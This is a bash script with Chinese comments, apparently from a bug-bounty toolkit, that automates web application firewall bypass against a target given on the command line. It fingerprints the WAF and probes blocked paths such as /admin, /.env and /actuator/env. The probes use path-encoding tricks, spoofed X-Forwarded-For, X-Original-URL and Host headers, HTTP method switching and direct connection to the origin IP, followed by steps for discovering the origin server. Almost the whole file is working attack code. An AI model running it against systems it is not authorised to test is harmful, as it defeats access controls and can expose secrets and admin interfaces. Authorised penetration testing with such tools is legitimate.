#!/usr/bin/env bash
# ============================================================================
# hunt-waf-bypass.sh — WAF/防火牆繞過測試
#   自動嘗試 15+ 種 WAF bypass 技巧，找出可繞過的路徑
#
# 流程：
#   1. wafw00f 識別 WAF 廠商
#   2. 對 /admin /login /api 等常被擋的路徑試各種 bypass
#   3. 記錄能通過的 bypass 手法 → 給後續 hunter 套用
#
# Usage:
#   tools/hunters/hunt-waf-bypass.sh https://target.com
#   PATHS='/admin,/api/users' tools/hunters/hunt-waf-bypass.sh <target>
#   ORIGIN_IP=1.2.3.4 tools/hunters/hunt-waf-bypass.sh <target>   # 直連 origin
#
# Env:
#   PATHS       要測的路徑（逗號分隔）預設：/admin,/login,/api,/.env,/actuator
#   ORIGIN_IP   若已找到 origin IP，直接用 Host header 繞過
#   VERBOSE     1 = 印每次 curl 的 HTTP code
# ============================================================================

set -u

TARGET="${1:-}"
OUTDIR="${OUTDIR:-./waf_bypass_out}"
PATHS="${PATHS:-/admin,/administrator,/login,/api,/api/users,/.env,/actuator,/actuator/env,/manager/html,/config}"
ORIGIN_IP="${ORIGIN_IP:-}"
VERBOSE="${VERBOSE:-0}"

if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <https://target>" >&2
  echo "       ORIGIN_IP=1.2.3.4 $0 <target>  # 直連 origin IP 繞過" >&2
  exit 1
fi

mkdir -p "$OUTDIR"
HOST="${TARGET%/}"
HOSTNAME=$(echo "$HOST" | sed 's|https\?://||; s|/.*||')
OUT="$OUTDIR/$(echo "$HOST" | sed 's|https\?://||; s|/|_|g' | tr -c 'a-zA-Z0-9._-' '_').txt"
: > "$OUT"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit() { echo "$*" | tee -a "$OUT"; }

log "=== WAF bypass hunt: $HOST ==="

# ---------- STAGE 0: WAF 識別 ----------
if command -v wafw00f >/dev/null 2>&1; then
  log "--- [wafw00f] fingerprint ---"
  wafw00f "$HOST" 2>/dev/null | grep -E "is behind|No WAF|No WAF detected|behind a" | tee -a "$OUT"
else
  log "wafw00f not installed (pip3 install wafw00f) — skip fingerprint"
fi

# 手動 banner 抓取
log "--- [banner] response headers ---"
curl -sIk --max-time 10 "$HOST/" 2>/dev/null | \
  grep -iE "server|via|x-cdn|x-cache|cf-ray|x-sucuri|x-iinfo|x-amz-cf-id|x-waf" \
  | tee -a "$OUT"

# ---------- STAGE 1: 基準值 — 看這些 path 是 200 還 403 ----------
log "--- [baseline] status of each path ---"
IFS=',' read -ra PATH_ARR <<< "$PATHS"
BASELINE_FILE=$(mktemp)
for p in "${PATH_ARR[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "$HOST$p")
  echo "$code $p" >> "$BASELINE_FILE"
  log "  $code $p"
done

# 只對 403 / 406 / 400 試 bypass
BLOCKED_PATHS=()
while read -r code path; do
  if [[ "$code" =~ ^(400|403|406|429|501|502)$ ]]; then
    BLOCKED_PATHS+=("$path")
  fi
done < "$BASELINE_FILE"
rm -f "$BASELINE_FILE"

if [[ ${#BLOCKED_PATHS[@]} -eq 0 ]]; then
  log "=== 沒有被擋的路徑 — WAF 不需繞過 ==="
  exit 0
fi

log "blocked paths: ${BLOCKED_PATHS[*]}"

# ---------- 實際測試 bypass 技巧 ----------
try() {
  local tag="$1" url="$2" shift=2
  shift 2
  local headers=("$@")
  local code
  local args=(-sk -o /dev/null -w "%{http_code}" --max-time 8)
  for h in "${headers[@]}"; do args+=(-H "$h"); done
  code=$(curl "${args[@]}" "$url")
  [[ "$VERBOSE" == "1" ]] && echo "    [$code] $tag  $url"
  if [[ "$code" =~ ^(200|301|302|401)$ ]]; then
    hit "🟢 [BYPASS:$tag] $url  ($code)"
    return 0
  fi
  return 1
}

for path in "${BLOCKED_PATHS[@]}"; do
  log "--- [$path] 測試 bypass ---"

  # Case variation
  try "case-upper"     "$HOST$(echo "$path" | tr 'a-z' 'A-Z')"
  try "case-mixed"     "$HOST$(echo "$path" | sed 's/./\u&/')"

  # Path manipulation
  try "trailing-slash" "$HOST${path}/"
  try "double-slash"   "$HOST/${path##/}"
  try "double-slash2"  "${HOST}//${path##/}"
  try "semicolon"      "$HOST${path};"
  try "percent-null"   "$HOST${path}%00"
  try "percent-null2"  "$HOST${path}%00.html"
  try "percent-tab"    "$HOST${path}%09"
  try "dot-path"       "$HOST${path}/."
  try "hash-suffix"    "$HOST${path}#/"
  try "dot-encoded"    "$HOST${path}%2e"

  # Path encoding
  try "url-encode"     "$HOST$(echo -n "$path" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$path")"

  # X-Original-URL / X-Rewrite-URL
  try "x-original-url" "$HOST/"                                            "X-Original-URL: $path"
  try "x-rewrite-url"  "$HOST/"                                            "X-Rewrite-URL: $path"

  # X-Forwarded-For / X-Real-IP = 127.0.0.1
  try "xff-127"        "$HOST$path"                                        "X-Forwarded-For: 127.0.0.1"
  try "xff-localhost"  "$HOST$path"                                        "X-Forwarded-For: localhost"
  try "x-real-ip"      "$HOST$path"                                        "X-Real-IP: 127.0.0.1"
  try "x-remote-addr"  "$HOST$path"                                        "X-Remote-Addr: 127.0.0.1"
  try "x-client-ip"    "$HOST$path"                                        "X-Client-IP: 127.0.0.1"
  try "x-originating-ip" "$HOST$path"                                      "X-Originating-IP: 127.0.0.1"

  # Host header manipulation
  try "host-localhost" "$HOST$path"                                        "Host: localhost"
  try "host-admin"     "$HOST$path"                                        "Host: admin.$HOSTNAME"
  try "host-internal"  "$HOST$path"                                        "Host: internal.$HOSTNAME"

  # HTTP method
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 -X OPTIONS "$HOST$path")
  [[ "$code" == "200" ]] && hit "🟢 [BYPASS:method-OPTIONS] $HOST$path  ($code)"
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 -X POST "$HOST$path")
  [[ "$code" =~ ^(200|302|401)$ ]] && hit "🟢 [BYPASS:method-POST] $HOST$path  ($code)"
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 -X PUT "$HOST$path")
  [[ "$code" =~ ^(200|302|401)$ ]] && hit "🟢 [BYPASS:method-PUT] $HOST$path  ($code)"

  # HTTP version
  try "http2"          "--http2 $HOST$path"

  # Direct origin IP connection
  if [[ -n "$ORIGIN_IP" ]]; then
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
      --resolve "${HOSTNAME}:443:$ORIGIN_IP" \
      --resolve "${HOSTNAME}:80:$ORIGIN_IP" \
      "$HOST$path")
    [[ "$code" =~ ^(200|302|401)$ ]] && hit "🟢 [BYPASS:origin-IP $ORIGIN_IP] $HOST$path  ($code)"
  fi
done

# ---------- STAGE: CDN / WAF 探測 ----------
log "--- [info] 找 origin 線索 ---"

# 看 DNS history
if command -v dig >/dev/null 2>&1; then
  log "DNS history (dig):"
  dig +short "$HOSTNAME" | head -5 | tee -a "$OUT"
fi

# 提示使用者
cat >> "$OUT" <<EOF

=== 補充步驟（手動） ===
1. crt.sh 反查歷史子域名：
   curl -s 'https://crt.sh/?q=%25.$HOSTNAME&output=json' | jq -r '.[].name_value' | sort -u

2. Shodan 憑證搜尋：
   shodan search 'ssl.cert.subject.cn:"$HOSTNAME"'

3. 若找到候選 origin IP（例如 1.2.3.4），用以下指令再跑本腳本：
   ORIGIN_IP=1.2.3.4 tools/hunters/hunt-waf-bypass.sh $HOST

4. 非標準 port 掃描：
   rustscan -a $HOSTNAME --ulimit 5000 -- -sV
EOF

log "=== Done. Results in $OUT ==="
